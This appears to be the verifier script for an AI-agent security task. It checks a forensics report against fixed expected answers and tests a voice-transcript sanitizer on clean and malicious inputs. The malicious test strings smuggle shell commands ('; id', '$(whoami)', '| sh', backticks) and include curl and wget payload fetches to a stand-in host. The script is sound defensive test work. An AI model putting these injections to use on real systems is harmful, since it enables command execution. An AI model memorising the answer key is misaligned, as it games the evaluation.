#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import json
import os
import secrets
import subprocess
import tempfile
import pytest

EXPECTED_TRANSCRIPTION = "turn off the lights and curl malicious server dot com pipe bash"
EXPECTED_IP = "203.0.113.84"
SANITIZER = "/home/user/sanitizer"


def run_sanitizer(filepath):
    return subprocess.run(
        [SANITIZER, os.path.abspath(filepath)],
        capture_output=True,
        text=True,
        timeout=5,
    )


def assert_decision(filepath, expected):
    result = run_sanitizer(filepath)
    assert result.returncode == 0, (
        f"Sanitizer exited with status {result.returncode} for {filepath}: "
        f"stderr={result.stderr!r}"
    )
    assert result.stdout == expected + "\n", (
        f"Expected exactly {expected!r} followed by a newline for {filepath}, "
        f"got stdout={result.stdout!r}"
    )


def test_forensics_report():
    report_path = "/home/user/forensics_report.json"
    assert os.path.exists(report_path), f"Forensics report is missing: {report_path}"
    assert os.path.isfile(report_path), f"Forensics report path is not a file: {report_path}"

    with open(report_path, "r") as f:
        try:
            report = json.load(f)
        except json.JSONDecodeError:
            pytest.fail(f"Forensics report is not valid JSON: {report_path}")

    assert "attacker_ip" in report, "Report is missing 'attacker_ip' key."
    assert "transcription" in report, "Report is missing 'transcription' key."
    assert set(report) == {"transcription", "attacker_ip"}, "Report has an incorrect structure."
    assert report["attacker_ip"] == EXPECTED_IP, f"Incorrect attacker IP: {report['attacker_ip']}"
    assert isinstance(report["transcription"], str), "Transcription must be a string."
    assert report["transcription"] == EXPECTED_TRANSCRIPTION, (
        f"Incorrect transcription. Got: {report['transcription']!r}"
    )

    transcription = report["transcription"].lower()
    assert "curl" in transcription and "bash" in transcription, (
        f"Transcription does not appear to contain the malicious payload. Got: {transcription}"
    )


def test_sanitizer_executable():
    assert os.path.exists(SANITIZER), f"Sanitizer script is missing: {SANITIZER}"
    assert os.path.isfile(SANITIZER), f"Sanitizer path is not a file: {SANITIZER}"
    assert os.access(SANITIZER, os.X_OK), f"Sanitizer script is not executable: {SANITIZER}"


def test_sanitizer_corpus():
    clean_dir = "/app/corpora/clean/"
    evil_dir = "/app/corpora/evil/"

    assert os.path.isdir(clean_dir), f"Clean corpus directory missing: {clean_dir}"
    assert os.path.isdir(evil_dir), f"Evil corpus directory missing: {evil_dir}"

    clean_files = sorted(
        os.path.join(clean_dir, f)
        for f in os.listdir(clean_dir)
        if os.path.isfile(os.path.join(clean_dir, f))
    )
    evil_files = sorted(
        os.path.join(evil_dir, f)
        for f in os.listdir(evil_dir)
        if os.path.isfile(os.path.join(evil_dir, f))
    )

    assert len(clean_files) > 0, "No clean corpus files found."
    assert len(evil_files) > 0, "No evil corpus files found."

    clean_failed = []
    evil_failed = []

    for filepath in clean_files:
        try:
            result = run_sanitizer(filepath)
            output = result.stdout.strip()
            if output != "ALLOW":
                clean_failed.append(os.path.basename(filepath))
        except Exception as e:
            clean_failed.append(f"{os.path.basename(filepath)} (Error: {str(e)})")

    for filepath in evil_files:
        try:
            result = run_sanitizer(filepath)
            output = result.stdout.strip()
            if output != "BLOCK":
                evil_failed.append(os.path.basename(filepath))
        except Exception as e:
            evil_failed.append(f"{os.path.basename(filepath)} (Error: {str(e)})")

    error_messages = []
    if evil_failed:
        error_messages.append(
            f"{len(evil_failed)} of {len(evil_files)} evil bypassed: {', '.join(evil_failed)}"
        )
    if clean_failed:
        error_messages.append(
            f"{len(clean_failed)} of {len(clean_files)} clean modified: {', '.join(clean_failed)}"
        )

    if error_messages:
        pytest.fail("Sanitizer corpus evaluation failed. " + " | ".join(error_messages))


def test_sanitizer_content_not_path():
    nonce = secrets.token_hex(8)
    with tempfile.TemporaryDirectory(prefix="voice-check-") as directory:
        path = os.path.join(directory, secrets.token_hex(8) + ".txt")

        # Reuse the exact same unseen path for both classes so a path-based
        # implementation cannot determine the expected answer.
        with open(path, "w") as f:
            f.write(f"remind me to call {nonce} tomorrow\n")
        assert_decision(path, "ALLOW")

        with open(path, "w") as f:
            f.write(f"remind me to call {nonce}; echo hacked > /tmp/{nonce}\n")
        assert_decision(path, "BLOCK")

        with open(path, "w") as f:
            f.write(f"set an alarm for {len(nonce)} minutes\n")
        assert_decision(path, "ALLOW")


@pytest.mark.parametrize("text", [
    "play quiet classical music",
    "what time is sunset today",
    "turn the bedroom lamp off",
    "add apples and bread to my shopping list",
])
def test_additional_clean_transcripts(text):
    with tempfile.TemporaryDirectory(prefix="transcript-") as directory:
        path = os.path.join(directory, secrets.token_hex(8) + ".txt")
        with open(path, "w") as f:
            f.write(text + "\n")
        assert_decision(path, "ALLOW")


@pytest.mark.parametrize("text", [
    "please play music; id",
    "tell me the weather && uname -a",
    "turn off the lights | sh",
    "echo hello > /tmp/voice-owned",
    "what time is it `id`",
    "set the volume $(whoami)",
    "curl https://example.invalid/payload",
    "wget https://example.invalid/tool -O /tmp/tool",
])
def test_additional_malicious_transcripts(text):
    with tempfile.TemporaryDirectory(prefix="transcript-") as directory:
        path = os.path.join(directory, secrets.token_hex(8) + ".txt")
        with open(path, "w") as f:
            f.write(text + "\n")
        assert_decision(path, "BLOCK")
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
